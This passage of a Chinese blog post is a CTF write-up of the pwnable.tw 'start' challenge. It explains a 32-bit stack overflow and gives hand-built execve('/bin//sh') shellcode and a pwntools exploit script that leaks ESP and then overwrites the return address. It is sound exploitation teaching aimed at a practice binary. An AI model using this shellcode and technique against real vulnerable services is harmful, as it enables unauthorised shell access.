+<span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span> <span style="color:#a6e22e">Linux</span> <span style="color:#66d9ef">System</span> <span style="color:#66d9ef">Call</span> <span style="color:#960050;background-color:#1e0010">接</span><span style="color:#960050;background-color:#1e0010">收</span><span style="color:#960050;background-color:#1e0010">用</span><span style="color:#960050;background-color:#1e0010">户</span><span style="color:#960050;background-color:#1e0010">输</span><span style="color:#960050;background-color:#1e0010">入</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#66d9ef">buffer</span> <span style="color:#960050;background-color:#1e0010">大</span><span style="color:#960050;background-color:#1e0010">小</span><span style="color:#960050;background-color:#1e0010">为</span> <span style="color:#ae81ff">0x3c</span> 
+ <span style="color:#ae81ff">8048091</span>:	<span style="color:#ae81ff">31</span> <span style="color:#66d9ef">db</span>                	<span style="color:#66d9ef">xor</span>    <span style="color:#66d9ef">ebx</span>,<span style="color:#66d9ef">ebx</span>  <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#66d9ef">exb</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">stdin</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">b2</span> <span style="color:#ae81ff">3</span><span style="color:#66d9ef">c</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">dl</span>,<span style="color:#ae81ff">0x3c</span>  <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">共</span><span style="color:#960050;background-color:#1e0010">接</span><span style="color:#960050;background-color:#1e0010">收</span> <span style="color:#ae81ff">60</span> <span style="color:#960050;background-color:#1e0010">个</span><span style="color:#960050;background-color:#1e0010">字</span><span style="color:#960050;background-color:#1e0010">符</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">5</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">b0</span> <span style="color:#ae81ff">03</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0x3</span>   <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span><span style="color:#960050;background-color:#1e0010">号</span><span style="color:#ae81ff">3</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">cd</span> <span style="color:#ae81ff">80</span>                	<span style="color:#66d9ef">int</span>    <span style="color:#ae81ff">0x80</span>     <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span>
+</code></pre></div><p>注意接收用户输入部分，<code>ecx</code> 未进行操作，值仍为之前设置的栈顶位置，所以用户输入会入栈。同时，&ldquo;Let&rsquo;s start the CTF:&rdquo; 在栈中共占据 0x14 个字节，接收时却最大可以输入 0x3c 个字节，显然，这里存在栈溢出！</p>
+<p>简单梳理下接收用户参数前，</p>
+<pre><code>             H +----------------+
+               |   Pushed ESP   |
+               +----------------+
+               |     _exit      |
+               +----------------+    &lt;---
+               |      CTF:      |      |
+               +----------------+      |
+               |      the       |      |
+               +----------------+      |
+               |      art       |    0x14 bytes
+               +----------------+      |  
+               |      s st      |      |
+               +----------------+      |
+               |      Let'      |      |
+ESP/ECX ---&gt; L +----------------+    &lt;---
+</code></pre><p>在输入的过程中，用户输入的数据会从低地址开始依次覆盖栈中的内容，所以，如果用户输入长度超过20，就会把栈底的返回地址和 保存的 ESP 给覆盖了。</p>
+<h2 id="getshell">GetShell</h2>
+<p>使用 <code>peda</code> 载入可执行程序后，<code>checksec</code> 分析应用启用的安全措施，如下：</p>
+<p><img src="https://i.loli.net/2019/02/13/5c6306380262c.jpg" alt="-w180"></p>
+<p>显示 NX（Not Execute）已启用，然而 <code>pwntools</code> 里的 <code>checksec</code> 命令检查 NX 是 disable 掉的，事实上也确实是 disable 的。</p>
+<p><img src="https://i.loli.net/2019/02/13/5c6306380cd2d.jpg" alt="-w493"></p>
+<p>既然没有任何安全措施，栈也是可执行的，我们可以直接把 shellcode 布置在栈上，然后构造参数通过 <code>int 80</code> 调用 <code>sys_execve</code> 执行 <code>/bin/sh</code>。</p>
+<h3 id="构造-shellcode">构造 shellcode</h3>
+<p>目前我们的思路已经清晰了，就是通过 <code>sys_execve</code> 执行 <code>/bin/sh</code>。依据 <a href="https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html">Linux System Call Table 参考</a>， <code>sys_execve</code> 仅需要一个参数：可执行文件路径，放到 ebx 中，所以，我们得把 <code>/bin/sh</code> 这个字符串放到栈中。<code>/bin/sh</code> 一共7个字符，为了凑够 8 个字节，我们把 <code>/bin/sh</code> 处理成 <code>/bin//sh</code>。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>     <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">清</span><span style="color:#960050;background-color:#1e0010">空</span> <span style="color:#66d9ef">eax</span>
+<span style="color:#a6e22e">push</span>   <span style="color:#66d9ef">eax</span>         <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">放</span><span style="color:#960050;background-color:#1e0010">个</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">到</span><span style="color:#960050;background-color:#1e0010">栈</span><span style="color:#960050;background-color:#1e0010">里</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#960050;background-color:#1e0010">当</span><span style="color:#960050;background-color:#1e0010">作</span><span style="color:#960050;background-color:#1e0010">字</span><span style="color:#960050;background-color:#1e0010">符</span><span style="color:#960050;background-color:#1e0010">串</span><span style="color:#960050;background-color:#1e0010">结</span><span style="color:#960050;background-color:#1e0010">束</span>
+<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x68732f2f</span>  <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">sh</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#960050;background-color:#1e0010">入</span><span style="color:#960050;background-color:#1e0010">栈</span>, <span style="color:#ae81ff">0x68732f2f</span> <span style="color:#960050;background-color:#1e0010">是</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">sh</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#960050;background-color:#1e0010">的</span> <span style="color:#66d9ef">ASCII</span> <span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">进</span><span style="color:#960050;background-color:#1e0010">制</span><span style="color:#960050;background-color:#1e0010">编</span><span style="color:#960050;background-color:#1e0010">码</span>
+<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x6e69622f</span>  <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">bin</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#960050;background-color:#1e0010">入</span><span style="color:#960050;background-color:#1e0010">栈</span><span style="color:#960050;background-color:#1e0010">。</span>
+<span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">ebx</span>,<span style="color:#66d9ef">esp</span>     <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">把</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">bin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">sh</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#960050;background-color:#1e0010">的</span><span style="color:#960050;background-color:#1e0010">地</span><span style="color:#960050;background-color:#1e0010">址</span><span style="color:#960050;background-color:#1e0010">赋</span><span style="color:#960050;background-color:#1e0010">值</span><span style="color:#960050;background-color:#1e0010">给</span> <span style="color:#66d9ef">ebx</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#960050;background-color:#1e0010">这</span><span style="color:#960050;background-color:#1e0010">是</span> <span style="color:#66d9ef">sys_execve</span> <span style="color:#960050;background-color:#1e0010">的</span><span style="color:#960050;background-color:#1e0010">要</span><span style="color:#960050;background-color:#1e0010">求</span>
+<span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">ecx</span>     <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">清</span><span style="color:#960050;background-color:#1e0010">空</span> <span style="color:#66d9ef">ecx</span>
+<span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">edx</span>,<span style="color:#66d9ef">edx</span>     <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">清</span><span style="color:#960050;background-color:#1e0010">空</span> <span style="color:#66d9ef">ecx</span>
+<span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0xb</span>      <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">设</span><span style="color:#960050;background-color:#1e0010">置</span><span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span><span style="color:#960050;background-color:#1e0010">号</span> <span style="color:#ae81ff">0xb</span>(<span style="color:#ae81ff">11</span>)
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span> <span style="color:#66d9ef">system</span> <span style="color:#66d9ef">call</span>
+</code></pre></div><h3 id="pwn">PWN</h3>
+<p>在前边我们已经构造好了 shellcode，下边就使用 <code>pwntools</code> 进行本地测试以及获取 flag。</p>
+<p>我们需要覆盖程序的返回地址达到控制程序流程的目的，所以我们需要获取 <code>esp</code> 的地址，注意地址为 <code>0x8048087</code> 的这条指令，是输出部分的代码，恰好将 <code>esp</code> 的地址赋值给了 <code>ecx</code>，我们可以将返回地址覆盖为 <code>0x8048087</code> 从而得到 <code>esp</code> 地址。</p>
+<p>因为我们把程序返回地址修改为了输入部分，所以可以继续输入，再次输入，将 shellcode 覆盖在返回地址之后，将返回地址覆盖为 shellcode 开始的位置即可。
+代码如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># -*- coding: UTF-8</span>
+<span style="color:#75715e"># pwnable.tw callenge &#34;start&#34; pwn script</span>
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+SHELLCODE <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">xor    eax,eax</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">push   eax</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">push   0x68732f2f</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">push   0x6e69622f</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">mov    ebx,esp</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">xor    ecx,ecx</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">xor    edx,edx</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">mov    al,0xb</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">int    0x80</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+NORMAL_INPUT_LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x14</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#34;</span>:
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwn</span><span style="color:#e6db74">&#39;</span>:
+        proc <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">chall.pwnable.tw</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">10000</span>)
+    <span style="color:#66d9ef">else</span>:
+        proc <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./start</span><span style="color:#e6db74">&#39;</span>)
+
+    <span style="color:#75715e"># 泄漏 esp</span>
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> NORMAL_INPUT_LEN <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x8048087</span>)
+    proc<span style="color:#f92672">.</span>send(payload)
+    proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#39;</span>)
+
+    esp_addr <span style="color:#f92672">=</span> u32(proc<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ESP addr is: </span><span style="color:#e6db74">&#39;</span>, hex(esp_addr))
+
+    <span style="color:#75715e"># 发送 shellcode，get shell    </span>
+    context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">i386</span><span style="color:#e6db74">&#39;</span>
+    shellcode <span style="color:#f92672">=</span> asm(SHELLCODE)    
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> NORMAL_INPUT_LEN <span style="color:#75715e"># 正常的最大输入 20 个字符</span>
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(esp_addr <span style="color:#f92672">+</span> NORMAL_INPUT_LEN) <span style="color:#75715e"># 覆盖 _exit</span>
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> shellcode
+    proc<span style="color:#f92672">.</span>send(payload)
+
+    proc<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>栈变化如下：
+开始时：</p>
+<pre><code>             H +----------------+
+               |   Pushed ESP   |
+               +----------------+
+               |     _exit      |
+               +----------------+    &lt;---
+               |      CTF:      |      |
+               +----------------+      |
+               |      the       |      |
+               +----------------+      |
+               |      art       |    0x14 bytes              
+               +----------------+      |  
+               |      s st      |      |
+               +----------------+      |
+               |      Let'      |      |
+ESP/ECX ---&gt; L +----------------+    &lt;---
+</code></pre><p>泄漏 ESP 时：</p>
+<pre><code>
+             H +----------------+
+               |   Pushed ESP   |
+               +----------------+
+               |   0x8048087    |
+               +----------------+    &lt;---
+               |      aaaa      |      |
+               +----------------+      |
+               |      aaaa      |      |
+               +----------------+      |
+               |      aaaa      |    0x14 bytes
+               +----------------+      |  
+               |      aaaa      |      |
+               +----------------+      |
+               |      aaaa      |      |
+ESP ---&gt;     L +----------------+    &lt;---
+</code></pre><p>Get shell 时：</p>
+<pre><code>             H +----------------+
+               |      ...       |
+               +----------------+
+               |    shellcode   |
+               +----------------+
+               |   esp + 0x14   |
+               +----------------+    &lt;---
+               |      aaaa      |      |
+               +----------------+      |
+               |      aaaa      |      |
+               +----------------+      |
+               |      aaaa      |    0x14 bytes
+               +----------------+      |  
+               |      aaaa      |      |
+               +----------------+      |
+               |      aaaa      |      |
+ESP ---&gt;     L +----------------+    &lt;---
+</code></pre>
+                        </div>
+
+                        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="https://www.tylinux.com/">tylinux</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://www.tylinux.com/post/pwnable-0x00-start/">https://www.tylinux.com/post/pwnable-0x00-start/</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+                        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/post/install-jenkins-with-docker-on-synology/">在群晖中使用 Docker 安装 Jenkins</a></li>
+        
+        <li><a href="/post/upgrade-from-iOS-11-1-2-to-iOS-11-3-1-with-blob/">使用 futurerestore 从 iOS 11.1.2 升级至 11.3.1</a></li>
+        
+        <li><a href="/post/Remount-rootfs-after-iOS-11-3/">(译) 在 iOS 11.3 之后的系统中 remount RootFS 为可读写</a></li>
+        
+        <li><a href="/post/how-dumpdecrypted-dylib-works/">dumpdecrypted.dylib 原理分析</a></li>
+        
+        <li><a href="/post/install-tweak-with-electra-on-ios11/">iOS 11.0 - 11.1.2 越狱插件安装指南</a></li>
+        
+    </ul>
+</div>
+
+
+                        <div class="post-meta meta-tags">
+                            
+                            <ul class="clearfix">
+                                
+                                <li><a href="https://www.tylinux.com/tags/pwn">pwn</a></li>
+                                
+                                <li><a href="https://www.tylinux.com/tags/overflow">overflow</a></li>
+                                
+                            </ul>
+                            
+                        </div>
+                    </article>
+                    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "tylinux/BlogComments"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+                </div>
+            </div>
+            <div id="secondary">
+    <section class="widget">
+        <form id="search" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://www.tylinux.com/">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://www.tylinux.com/post/downgrade-iOS-13-3-to-13-2-3/" title="iPhone SE 降级 iOS 13.2.3">iPhone SE 降级 iOS 13.2.3</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/build-virtualbox-on-macOS-10.15/" title="macOS 10.15.1 下编译 VirtualBox 6.1.0">macOS 10.15.1 下编译 VirtualBox 6.1.0</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/hackintosh-with-amd-ryzen-3700x/" title="喜提新开(you)发(xi)机">喜提新开(you)发(xi)机</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/develop-mcs51-on-macOS/" title="macOS 下开发 51 单片机应用">macOS 下开发 51 单片机应用</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/fix-a-react-native-crash-on-mutex/" title="React Native 疑难 Crash 一例">React Native 疑难 Crash 一例</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/hackintosh-with-amd-ryzen-1700/" title="AMD Ryzen 1700 也吃黑苹果">AMD Ryzen 1700 也吃黑苹果</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/pwnable-0x01-orw/" title="pwnable.tw 0x1 orw writeup">pwnable.tw 0x1 orw writeup</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/pwnable-0x00-start/" title="pwnable.tw 0x0 start writeup">pwnable.tw 0x0 start writeup</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/install-jenkins-with-docker-on-synology/" title="在群晖中使用 Docker 安装 Jenkins">在群晖中使用 Docker 安装 Jenkins</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/post/upgrade-from-iOS-11-1-2-to-iOS-11-3-1-with-blob/" title="使用 futurerestore 从 iOS 11.1.2 升级至 11.3.1">使用 futurerestore 从 iOS 11.1.2 升级至 11.3.1</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">分类</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://www.tylinux.com/categories/iOS%E5%BC%80%E5%8F%91/">iOS开发(1)</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全(2)</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/categories/%E7%A1%AC%E4%BB%B6/">硬件(3)</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/categories/%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8/">系统应用(3)</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/">软件开发(1)</a>
+    </li>
+    
+    <li>
+        <a href="https://www.tylinux.com/categories/%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/">逆向研究(7)</a>
+    </li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title">标签</h3>
+<div class="tagcloud">
+    
+    <a href="https://www.tylinux.com/tags/51/">51</a>
+    
+    <a href="https://www.tylinux.com/tags/Console/">Console</a>
+    
+    <a href="https://www.tylinux.com/tags/Cydia/">Cydia</a>
+    
+    <a href="https://www.tylinux.com/tags/Jailbreak/">Jailbreak</a>
+    
+    <a href="https://www.tylinux.com/tags/SHSH/">SHSH</a>
+    
+    <a href="https://www.tylinux.com/tags/android/">android</a>
+    
+    <a href="https://www.tylinux.com/tags/arm/">arm</a>
+    
+    <a href="https://www.tylinux.com/tags/docker/">docker</a>
+    
+    <a href="https://www.tylinux.com/tags/hackintosh/">hackintosh</a>
+    
+    <a href="https://www.tylinux.com/tags/iOS/">iOS</a>
+    
+    <a href="https://www.tylinux.com/tags/jenkins/">jenkins</a>
+    
+    <a href="https://www.tylinux.com/tags/linux/">linux</a>
+    
+    <a href="https://www.tylinux.com/tags/macOS/">macOS</a>
+    
+    <a href="https://www.tylinux.com/tags/overflow/">overflow</a>
+    
+    <a href="https://www.tylinux.com/tags/pwn/">pwn</a>
+    
+    <a href="https://www.tylinux.com/tags/reverse/">reverse</a>
+    
+    <a href="https://www.tylinux.com/tags/ryzen/">ryzen</a>
+    
+    <a href="https://www.tylinux.com/tags/synology/">synology</a>
+    
+    <a href="https://www.tylinux.com/tags/tweak/">tweak</a>
+    
+    <a href="https://www.tylinux.com/tags/virtualbox/">virtualbox</a>
+    
+    <a href="https://www.tylinux.com/tags/%E5%8D%95%E7%89%87%E6%9C%BA/">单片机</a>
+    
+    <a href="https://www.tylinux.com/tags/%E7%A1%AC%E4%BB%B6/">硬件</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://www.tylinux.com/index.xml">文章 RSS</a></li>
+            <li><a href="https://www.tylinux.com/index.xml"><img src="icons/rss.svg" style="width:16px; height:16px">订阅</a></li>
+        </ul>
+    </section>
+</div>
+        </div>
+    </div>
+</div>
+<footer id="footer">
+    <div class="container">
+        &copy; 2020 <a href="https://www.tylinux.com/">不正经的正经程序猿 By tylinux</a>.
+        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
+        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/rujews/maupassant-hugo" target="_blank">maupassant</a>.
+        
+    </div>
+</footer>
+
+
+    <script type="text/javascript">
+    
+    (function(){
+        $("pre code").parent().addClass("line-numbers")
+    }())
+
+    window.MathJax = {
+        tex2jax: {
+            inlineMath: [ ['$','$'] ],
+            processEscapes: true
+        }
+    };
+    </script>
+    <script type="text/javascript" src="/js/prism.js" async="true"></script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src="/js/totop.js?v=0.0.0" async=""></script>
+
+
+
+<script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+</body>
+</html>
